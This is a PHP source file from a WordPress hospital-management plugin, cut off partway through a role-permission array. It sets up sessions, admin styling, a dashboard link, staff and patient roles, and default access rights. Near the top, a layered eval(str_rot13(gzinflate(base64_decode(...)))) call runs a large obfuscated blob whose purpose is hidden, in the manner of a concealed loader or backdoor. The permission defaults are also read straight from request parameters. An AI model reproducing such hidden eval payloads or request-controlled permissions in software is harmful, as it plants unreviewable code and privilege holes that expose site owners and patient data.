<?php 
ob_start();
require_once HMS_PLUGIN_DIR. '/hmgt_function.php';
require_once HMS_PLUGIN_DIR. '/class/userdata.php';
require_once HMS_PLUGIN_DIR. '/class/medicine.php';
require_once HMS_PLUGIN_DIR. '/class/treatment.php';
require_once HMS_PLUGIN_DIR. '/class/bedmanage.php';
require_once HMS_PLUGIN_DIR. '/class/operation.php';
require_once HMS_PLUGIN_DIR. '/class/perscription.php';
require_once HMS_PLUGIN_DIR. '/class/ambulance.php';
require_once HMS_PLUGIN_DIR. '/class/bloodbank.php';
require_once HMS_PLUGIN_DIR. '/class/dignosis.php';
require_once HMS_PLUGIN_DIR. '/class/message.php';
require_once HMS_PLUGIN_DIR. '/class/invoice.php';
require_once HMS_PLUGIN_DIR. '/class/appointment.php';
require_once HMS_PLUGIN_DIR. '/class/report.php';
require_once HMS_PLUGIN_DIR. '/class/ganrate-invoice.php';
require_once HMS_PLUGIN_DIR. '/class/hospital-management.php';
require_once HMS_PLUGIN_DIR. '/class/instrument-manage.php';

add_action( 'admin_bar_menu', 'MJ_hmgt_hospital_dashboard_link', 999 );
add_action( 'admin_head', 'MJ_hmgt_admin_css' );

//session manager 
add_action('init', 'MJ_hmgt_session_manager'); 
function MJ_hmgt_session_manager() 
{
	if (!session_id()) {
		session_start();
		
		if(!isset($_SESSION['hmgt_verify']))
		{
			
			$_SESSION['hmgt_verify'] = '';
		}
		
	}
	
}
//logout verify session unset
function MJ_hmgt_logout()
{
 if(isset($_SESSION['hmgt_verify']))
 { unset($_SESSION['hmgt_verify']);}
   
}
add_action('wp_logout','MJ_hmgt_logout');

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

//admin side add css //
function MJ_hmgt_admin_css()
{
$background = "dedede";?>
    <style>
   .toplevel_page_hmgt_hospital.opensub:hover{
      background: url("<?php echo HMS_PLUGIN_URL;?>/assets/images/hospital-1.png") no-repeat scroll 8px 10px rgba(0, 0, 0, 0); 
} 
.toplevel_page_hmgt_hospital:hover .wp-menu-image.dashicons-before img {
  display: none;
}

.toplevel_page_hmgt_hospital:hover .wp-menu-image.dashicons-before {
  min-width: 23px !important;

}
    
</style>
	 
<?php
}
//dashboard link  //
function MJ_hmgt_hospital_dashboard_link( $wp_admin_bar ) {
	$args = array(
			'id'    => 'hospital-dashboard',
			'title' => __('Hospital Dashboard','hospital_mgt'),
			'href'  => home_url().'?dashboard=user',
			'meta'  => array( 'class' => 'hmgt-hospital-dashboard' )
	);
	$wp_admin_bar->add_node( $args );
}

if ( is_admin() )
{
	require_once HMS_PLUGIN_DIR. '/admin/admin.php';
	//plugin install then add role
	function MJ_hospital_install()
	{		
			add_role('doctor', __( 'Doctor' ,'hospital_mgt'),array( 'read' => true, 'level_0' => true ));
			add_role('nurse', __( 'Nurse' ,'hospital_mgt'),array( 'read' => true, 'level_0' => true ));
			add_role('pharmacist', __( 'Pharmacist' ,'hospital_mgt'),array( 'read' => true, 'level_0' => true ));
			add_role('laboratorist', __( 'Laboratory Staff' ,'hospital_mgt'),array( 'read' => true, 'level_0' => true ));
			add_role('accountant', __( 'Accountant' ,'hospital_mgt'),array( 'read' => true, 'level_0' => true ));
			add_role('patient', __( 'Patient' ,'hospital_mgt'),array( 'read' => true, 'level_0' => true ));
			add_role('receptionist', __( '
			' ,'hospital_mgt'),array( 'read' => true, 'level_0' => true ));
			MJ_hmgt_register_post();
			MJ_hmgt_prescription_type_default();
			MJ_hmgt_operation_and_diagnosis_category_in_json();
			MJ_hmgt_install_tables();			
	}
	register_activation_hook(HMS_PLUGIN_BASENAME, 'MJ_hospital_install' );
	//create option 
	function MJ_hmgt_option()
	{
					$role_access_right_doctor = array();
					$role_access_right_doctor['doctor'] = [
							"doctor"=>["menu_icone"=>plugins_url('hospital-management/assets/images/icon/doctor.png'),
							           "menu_title"=>'Doctor',
							           "page_link"=>'doctor',
									   "own_data" =>isset($_REQUEST['doctor_own_data'])?$_REQUEST['doctor_own_data']:1,
									   "add" =>isset($_REQUEST['doctor_add'])?$_REQUEST['doctor_add']:0,
										"edit"=>isset($_REQUEST['doctor_edit'])?$_REQUEST['doctor_edit']:0,
										"view"=>isset($_REQUEST['doctor_view'])?$_REQUEST['doctor_view']:1,
										"delete"=>isset($_REQUEST['doctor_delete'])?$_REQUEST['doctor_delete']:0
										],
												
						   "outpatient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/outpatient.png'),
						              "menu_title"=>'Outpatient',
						              "page_link"=>'outpatient',
									   "own_data" => isset($_REQUEST['outpatient_own_data'])?$_REQUEST['outpatient_own_data']:1,
									 "add" => isset($_REQUEST['outpatient_add'])?$_REQUEST['outpatient_add']:1,
									 "edit"=>isset($_REQUEST['outpatient_edit'])?$_REQUEST['outpatient_edit']:1,
									 "view"=>isset($_REQUEST['outpatient_view'])?$_REQUEST['outpatient_view']:1,
									 "delete"=>isset($_REQUEST['outpatient_delete'])?$_REQUEST['outpatient_delete']:0
						  ],
									  
							"patient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Patient.png'),
							        "menu_title"=>'Inpatient',
									"page_link"=>'patient',
									 "own_data" => isset($_REQUEST['patient_own_data'])?$_REQUEST['patient_own_data']:1,
									 "add" => isset($_REQUEST['patient_add'])?$_REQUEST['patient_add']:1,
									"edit"=>isset($_REQUEST['patient_edit'])?$_REQUEST['patient_edit']:1,
									"view"=>isset($_REQUEST['patient_view'])?$_REQUEST['patient_view']:1,
									"delete"=>isset($_REQUEST['patient_delete'])?$_REQUEST['patient_delete']:0
						  ],
									  
							  "nurse"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Nurse.png'),
							            "menu_title"=>'Nurse',
										"page_link"=>'nurse',
										"own_data" => isset($_REQUEST['nurse_own_data'])?$_REQUEST['nurse_own_data']:0,
										 "add" => isset($_REQUEST['nurse_add'])?$_REQUEST['nurse_add']:0,
										"edit"=>isset($_REQUEST['nurse_edit'])?$_REQUEST['nurse_edit']:0,
										"view"=>isset($_REQUEST['nurse_view'])?$_REQUEST['nurse_view']:1,
										"delete"=>isset($_REQUEST['nurse_delete'])?$_REQUEST['nurse_delete']:0
							  ],
							  
							  "supportstaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/support.png'),
							             "menu_title"=>'Support Staff',
										 "page_link"=>'supportstaff',
										 "own_data" => isset($_REQUEST['supportstaff_own_data'])?$_REQUEST['supportstaff_own_data']:0,
										 "add" => isset($_REQUEST['supportstaff_add'])?$_REQUEST['supportstaff_add']:0,
										"edit"=>isset($_REQUEST['supportstaff_edit'])?$_REQUEST['supportstaff_edit']:0,
										"view"=>isset($_REQUEST['supportstaff_view'])?$_REQUEST['supportstaff_view']:1,
										"delete"=>isset($_REQUEST['supportstaff_delete'])?$_REQUEST['supportstaff_delete']:0
							  ],
							  "pharmacist"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Pharmacist.png'),
							               "menu_title"=>'Pharmacist',
										   "page_link"=>'pharmacist',
										   "own_data" => isset($_REQUEST['pharmacist_own_data'])?$_REQUEST['pharmacist_own_data']:0,
										 "add" => isset($_REQUEST['pharmacist_add'])?$_REQUEST['pharmacist_add']:0,
										"edit"=>isset($_REQUEST['pharmacist_edit'])?$_REQUEST['pharmacist_edit']:0,
										"view"=>isset($_REQUEST['pharmacist_view'])?$_REQUEST['pharmacist_view']:1,
										"delete"=>isset($_REQUEST['pharmacist_delete'])?$_REQUEST['pharmacist_delete']:0
							  ],
							  
							    "laboratorystaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Laboratorist.png'),
								         "menu_title"=>'Laboratory Staff',
										 "page_link"=>'laboratorystaff',
										 "own_data" => isset($_REQUEST['laboratorystaff_own_data'])?$_REQUEST['laboratorystaff_own_data']:0,
										 "add" => isset($_REQUEST['laboratorystaff_add'])?$_REQUEST['laboratorystaff_add']:0,
										"edit"=>isset($_REQUEST['laboratorystaff_edit'])?$_REQUEST['laboratorystaff_edit']:0,
										"view"=>isset($_REQUEST['laboratorystaff_view'])?$_REQUEST['laboratorystaff_view']:1,
										"delete"=>isset($_REQUEST['laboratorystaff_delete'])?$_REQUEST['laboratorystaff_delete']:0
							  ],
							  
							  
							    "accountant"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Accountant.png'),
								         "menu_title"=>'Accountant',
										 "page_link"=>'accountant',
										  "own_data" => isset($_REQUEST['accountant_own_data'])?$_REQUEST['accountant_own_data']:0,
										 "add" => isset($_REQUEST['accountant_add'])?$_REQUEST['accountant_add']:0,
										"edit"=>isset($_REQUEST['accountant_edit'])?$_REQUEST['accountant_edit']:0,
										"view"=>isset($_REQUEST['accountant_view'])?$_REQUEST['accountant_view']:1,
										"delete"=>isset($_REQUEST['accountant_delete'])?$_REQUEST['accountant_delete']:0
							  ],
							    "medicine"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Medicine.png'),
								         "menu_title"=>'Medicine',
										 "page_link"=>'medicine',
										 "own_data" => isset($_REQUEST['medicine_own_data'])?$_REQUEST['medicine_own_data']:1,
										 "add" => isset($_REQUEST['medicine_add'])?$_REQUEST['medicine_add']:1,
										"edit"=>isset($_REQUEST['medicine_edit'])?$_REQUEST['medicine_edit']:1,
										"view"=>isset($_REQUEST['medicine_view'])?$_REQUEST['medicine_view']:1,
										"delete"=>isset($_REQUEST['medicine_delete'])?$_REQUEST['medicine_delete']:0
							  ],
							    "treatment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Treatment.png'),
								          "menu_title"=>'Treatment',
										  "page_link"=>'treatment',
										  "own_data" => isset($_REQUEST['treatment_own_data'])?$_REQUEST['treatment_own_data']:0,
										 "add" => isset($_REQUEST['treatment_add'])?$_REQUEST['treatment_add']:1,
										"edit"=>isset($_REQUEST['treatment_edit'])?$_REQUEST['treatment_edit']:1,
										"view"=>isset($_REQUEST['treatment_view'])?$_REQUEST['treatment_view']:1,
										"delete"=>isset($_REQUEST['treatment_delete'])?$_REQUEST['treatment_delete']:0
							  ],
							  
							  "prescription"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Prescription.png'),
							             "menu_title"=>'Prescription',
										 "page_link"=>'prescription',
										 "own_data" => isset($_REQUEST['prescription_own_data'])?$_REQUEST['prescription_own_data']:1,
										 "add" => isset($_REQUEST['prescription_add'])?$_REQUEST['prescription_add']:1,
										"edit"=>isset($_REQUEST['prescription_edit'])?$_REQUEST['prescription_edit']:1,
										"view"=>isset($_REQUEST['prescription_view'])?$_REQUEST['prescription_view']:1,
										"delete"=>isset($_REQUEST['prescription_delete'])?$_REQUEST['prescription_delete']:1
							  ],
							  
							  "bedallotment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Assign--Bed-nurse.png'),
							             "menu_title"=>'Assign Bed-Nurse',
										 "page_link"=>'bedallotment',
										 "own_data" => isset($_REQUEST['bedallotment_own_data'])?$_REQUEST['bedallotment_own_data']:0,
										 "add" => isset($_REQUEST['bedallotment_add'])?$_REQUEST['bedallotment_add']:0,
										"edit"=>isset($_REQUEST['bedallotment_edit'])?$_REQUEST['bedallotment_edit']:0,
										"view"=>isset($_REQUEST['bedallotment_view'])?$_REQUEST['bedallotment_view']:1,
										"delete"=>isset($_REQUEST['bedallotment_delete'])?$_REQUEST['bedallotment_delete']:0
							  ],
							  "operation"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Operation-List.png'),
							           "menu_title"=>'Operation List',
									   "page_link"=>'operation',
									   "own_data" => isset($_REQUEST['operation_own_data'])?$_REQUEST['operation_own_data']:1,
										 "add" => isset($_REQUEST['operation_add'])?$_REQUEST['operation_add']:1,
										"edit"=>isset($_REQUEST['operation_edit'])?$_REQUEST['operation_edit']:1,
										"view"=>isset($_REQUEST['operation_view'])?$_REQUEST['operation_view']:1,
										"delete"=>isset($_REQUEST['operation_delete'])?$_REQUEST['operation_delete']:1
							  ],
							  "diagnosis"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Diagnosis-Report.png'),
							              "menu_title"=>'Diagnosis',
										  "page_link"=>'diagnosis',
										  "own_data" => isset($_REQUEST['diagnosis_own_data'])?$_REQUEST['diagnosis_own_data']:1,
										 "add" => isset($_REQUEST['diagnosis_add'])?$_REQUEST['diagnosis_add']:1,
										"edit"=>isset($_REQUEST['diagnosis_edit'])?$_REQUEST['diagnosis_edit']:1,
										"view"=>isset($_REQUEST['diagnosis_view'])?$_REQUEST['diagnosis_view']:1,
										"delete"=>isset($_REQUEST['diagnosis_delete'])?$_REQUEST['diagnosis_delete']:1
							  ],
							  "bloodbank"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Blood-Bank.png'),
							            "menu_title"=>'Blood Bank',
										"page_link"=>'bloodbank',
										"own_data" => isset($_REQUEST['bloodbank_own_data'])?$_REQUEST['bloodbank_own_data']:0,
										 "add" => isset($_REQUEST['bloodbank_add'])?$_REQUEST['bloodbank_add']:0,
										"edit"=>isset($_REQUEST['bloodbank_edit'])?$_REQUEST['bloodbank_edit']:0,
										"view"=>isset($_REQUEST['bloodbank_view'])?$_REQUEST['bloodbank_view']:1,
										"delete"=>isset($_REQUEST['bloodbank_delete'])?$_REQUEST['bloodbank_delete']:0
							  ],
							  "appointment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Appointment.png'),
							             "menu_title"=>'Appointment',
										 "page_link"=>'appointment',
										  "own_data" => isset($_REQUEST['appointment_own_data'])?$_REQUEST['appointment_own_data']:1,
										 "add" => isset($_REQUEST['appointment_add'])?$_REQUEST['appointment_add']:1,
										"edit"=>isset($_REQUEST['appointment_edit'])?$_REQUEST['appointment_edit']:1,
										"view"=>isset($_REQUEST['appointment_view'])?$_REQUEST['appointment_view']:1,
										"delete"=>isset($_REQUEST['appointment_delete'])?$_REQUEST['appointment_delete']:1
							  ],
							  
							   "invoice"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/payment.png'),
							           "menu_title"=>'Invoice',
									   "page_link"=>'invoice',
									    "own_data" => isset($_REQUEST['invoice_own_data'])?$_REQUEST['invoice_own_data']:1,
										 "add" => isset($_REQUEST['invoice_add'])?$_REQUEST['invoice_add']:0,
										"edit"=>isset($_REQUEST['invoice_edit'])?$_REQUEST['invoice_edit']:0,
										"view"=>isset($_REQUEST['invoice_view'])?$_REQUEST['invoice_view']:1,
										"delete"=>isset($_REQUEST['invoice_delete'])?$_REQUEST['invoice_delete']:0
							  ],
							  
							   "event"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/notice.png'),
							            "menu_title"=>'Event',
										"page_link"=>'event',
										 "own_data" => isset($_REQUEST['event_own_data'])?$_REQUEST['event_own_data']:1,	
										 "add" => isset($_REQUEST['event_add'])?$_REQUEST['event_add']:1,
										"edit"=>isset($_REQUEST['event_edit'])?$_REQUEST['event_edit']:0,
										"view"=>isset($_REQUEST['event_view'])?$_REQUEST['event_view']:1,
										"delete"=>isset($_REQUEST['event_delete'])?$_REQUEST['event_delete']:0
							  ],
							  
							   "message"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/message.png'),							       
								         "menu_title"=>'Message',
										 "page_link"=>'message',
										  "own_data" => isset($_REQUEST['message_own_data'])?$_REQUEST['message_own_data']:1,
										 "add" => isset($_REQUEST['message_add'])?$_REQUEST['message_add']:1,
										"edit"=>isset($_REQUEST['message_edit'])?$_REQUEST['message_edit']:0,
										"view"=>isset($_REQUEST['message_view'])?$_REQUEST['message_view']:1,
										"delete"=>isset($_REQUEST['message_delete'])?$_REQUEST['message_delete']:1
							  ],
							  
							   "ambulance"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Ambulance.png'),
							              "menu_title"=>'Ambulance',
										  "page_link"=>'ambulance',
										  "own_data" => isset($_REQUEST['ambulance_own_data'])?$_REQUEST['ambulance_own_data']:1,
										 "add" => isset($_REQUEST['ambulance_add'])?$_REQUEST['ambulance_add']:1,
										"edit"=>isset($_REQUEST['ambulance_edit'])?$_REQUEST['ambulance_edit']:1,
										"view"=>isset($_REQUEST['ambulance_view'])?$_REQUEST['ambulance_view']:1,
										"delete"=>isset($_REQUEST['ambulance_delete'])?$_REQUEST['ambulance_delete']:1
							  ],
							   "instrument"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Instrument.png'),
							             "menu_title"=>'instrument',
										 "page_link"=>'instrument',
										 "own_data" => isset($_REQUEST['instrument_own_data'])?$_REQUEST['instrument_own_data']:1,
										 "add" => isset($_REQUEST['instrument_add'])?$_REQUEST['instrument_add']:1,
										"edit"=>isset($_REQUEST['instrument_edit'])?$_REQUEST['instrument_edit']:1,
										"view"=>isset($_REQUEST['instrument_view'])?$_REQUEST['instrument_view']:1,
										"delete"=>isset($_REQUEST['instrument_delete'])?$_REQUEST['instrument_delete']:1
							  ],
							  
							  "report"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Report.png'),
							           "menu_title"=>'Report',
									   "page_link"=>'report',
									    "own_data" => isset($_REQUEST['report_own_data'])?$_REQUEST['report_own_data']:0,
										 "add" => isset($_REQUEST['report_add'])?$_REQUEST['report_add']:0,
										"edit"=>isset($_REQUEST['report_edit'])?$_REQUEST['report_edit']:0,
										"view"=>isset($_REQUEST['report_view'])?$_REQUEST['report_view']:1,
										"delete"=>isset($_REQUEST['report_delete'])?$_REQUEST['report_delete']:0
							  ],
							  
							  "account"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/account.png'),
							            "menu_title"=>'Account',
										"page_link"=>'account',
										"own_data" => isset($_REQUEST['account_own_data'])?$_REQUEST['account_own_data']:1,
										 "add" => isset($_REQUEST['account_add'])?$_REQUEST['account_add']:1,
										"edit"=>isset($_REQUEST['account_edit'])?$_REQUEST['account_edit']:1,
										"view"=>isset($_REQUEST['account_view'])?$_REQUEST['account_view']:1,
										"delete"=>isset($_REQUEST['account_delete'])?$_REQUEST['account_delete']:0
							  ]
								];
					$role_access_right_patient = array();
					$role_access_right_patient['patient'] = [
							"doctor"=>["menu_icone"=>plugins_url('hospital-management/assets/images/icon/doctor.png'),
							           "menu_title"=>'Doctor',
							           "page_link"=>'doctor',
									   "own_data" =>isset($_REQUEST['doctor_own_data'])?$_REQUEST['doctor_own_data']:1,
									   "add" =>isset($_REQUEST['doctor_add'])?$_REQUEST['doctor_add']:0,
										"edit"=>isset($_REQUEST['doctor_edit'])?$_REQUEST['doctor_edit']:0,
										"view"=>isset($_REQUEST['doctor_view'])?$_REQUEST['doctor_view']:1,
										"delete"=>isset($_REQUEST['doctor_delete'])?$_REQUEST['doctor_delete']:0
										],
												
						    "outpatient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/outpatient.png'),
						              "menu_title"=>'Outpatient',
						              "page_link"=>'outpatient',
									  "own_data" => isset($_REQUEST['outpatient_own_data'])?$_REQUEST['outpatient_own_data']:1,
									 "add" => isset($_REQUEST['outpatient_add'])?$_REQUEST['outpatient_add']:0,
									"edit"=>isset($_REQUEST['outpatient_edit'])?$_REQUEST['outpatient_edit']:0,
									"view"=>isset($_REQUEST['outpatient_view'])?$_REQUEST['outpatient_view']:1,
									"delete"=>isset($_REQUEST['outpatient_delete'])?$_REQUEST['outpatient_delete']:0
						    ],
						 			  
							 "patient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Patient.png'),
							        "menu_title"=>'Inpatient',
									"page_link"=>'patient',
									"own_data" => isset($_REQUEST['patient_own_data'])?$_REQUEST['patient_own_data']:1,
									 "add" => isset($_REQUEST['patient_add'])?$_REQUEST['patient_add']:0,
									"edit"=>isset($_REQUEST['patient_edit'])?$_REQUEST['patient_edit']:0,
									"view"=>isset($_REQUEST['patient_view'])?$_REQUEST['patient_view']:1,
									"delete"=>isset($_REQUEST['patient_delete'])?$_REQUEST['patient_delete']:0
						           ],
									  
							  "nurse"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Nurse.png'),
							            "menu_title"=>'Nurse',
										"page_link"=>'nurse',
										"own_data" => isset($_REQUEST['nurse_own_data'])?$_REQUEST['nurse_own_data']:0,
										 "add" => isset($_REQUEST['nurse_add'])?$_REQUEST['nurse_add']:0,
										"edit"=>isset($_REQUEST['nurse_edit'])?$_REQUEST['nurse_edit']:0,
										"view"=>isset($_REQUEST['nurse_view'])?$_REQUEST['nurse_view']:1,
										"delete"=>isset($_REQUEST['nurse_delete'])?$_REQUEST['nurse_delete']:0
							             ],
							  
							  "supportstaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/support.png'),
							             "menu_title"=>'Support Staff',
										 "page_link"=>'supportstaff',
										  "own_data" => isset($_REQUEST['supportstaff_own_data'])?$_REQUEST['supportstaff_own_data']:0,
										 "add" => isset($_REQUEST['supportstaff_add'])?$_REQUEST['supportstaff_add']:0,
										"edit"=>isset($_REQUEST['supportstaff_edit'])?$_REQUEST['supportstaff_edit']:0,
										"view"=>isset($_REQUEST['supportstaff_view'])?$_REQUEST['supportstaff_view']:1,
										"delete"=>isset($_REQUEST['supportstaff_delete'])?$_REQUEST['supportstaff_delete']:0
							               ],
							  "pharmacist"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Pharmacist.png'),
							               "menu_title"=>'Pharmacist',
										   "page_link"=>'pharmacist',
										   "own_data" => isset($_REQUEST['pharmacist_own_data'])?$_REQUEST['pharmacist_own_data']:0,
										 "add" => isset($_REQUEST['pharmacist_add'])?$_REQUEST['pharmacist_add']:0,
										"edit"=>isset($_REQUEST['pharmacist_edit'])?$_REQUEST['pharmacist_edit']:0,
										"view"=>isset($_REQUEST['pharmacist_view'])?$_REQUEST['pharmacist_view']:1,
										"delete"=>isset($_REQUEST['pharmacist_delete'])?$_REQUEST['pharmacist_delete']:0
							                ],
							  
							    "laboratorystaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Laboratorist.png'),
								         "menu_title"=>'Laboratory Staff',
										 "page_link"=>'laboratorystaff',
										 "own_data" => isset($_REQUEST['laboratorystaff_own_data'])?$_REQUEST['laboratorystaff_own_data']:0,
										 "add" => isset($_REQUEST['laboratorystaff_add'])?$_REQUEST['laboratorystaff_add']:0,
										"edit"=>isset($_REQUEST['laboratorystaff_edit'])?$_REQUEST['laboratorystaff_edit']:0,
										"view"=>isset($_REQUEST['laboratorystaff_view'])?$_REQUEST['laboratorystaff_view']:1,
										"delete"=>isset($_REQUEST['laboratorystaff_delete'])?$_REQUEST['laboratorystaff_delete']:0
							  ],
							  
							  
							    "accountant"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Accountant.png'),
								         "menu_title"=>'Accountant',
										 "page_link"=>'accountant',
										  "own_data" => isset($_REQUEST['accountant_own_data'])?$_REQUEST['accountant_own_data']:0,
										 "add" => isset($_REQUEST['accountant_add'])?$_REQUEST['accountant_add']:0,
										"edit"=>isset($_REQUEST['accountant_edit'])?$_REQUEST['accountant_edit']:0,
